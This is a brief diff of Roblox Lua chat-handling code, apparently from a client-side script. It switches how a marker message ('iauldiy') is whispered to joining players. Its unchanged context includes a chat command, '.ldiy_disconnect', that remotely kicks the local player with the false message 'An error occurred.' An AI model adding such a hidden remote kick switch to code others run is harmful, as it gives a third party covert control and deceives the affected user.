@@ -2000,8 +2000,7 @@ game.Players.PlayerAdded:Connect(function(plr)
 				if isChatLegacy then
 					chatRemote:FireServer("iauldiy", plr.Name)
 				else
-					local pchannel = TextChatService:CreateTextChannelForUserAsync(plr.UserId)
-					pchannel:SendAsync("iauldiy")
+					chatChannel:SendAsync("/w "..plr.Name.." iauldiy")
 				end
 			elseif msg == ".ldiy_disconnect" then
 				game.Players.LocalPlayer:Kick("An error occurred.")
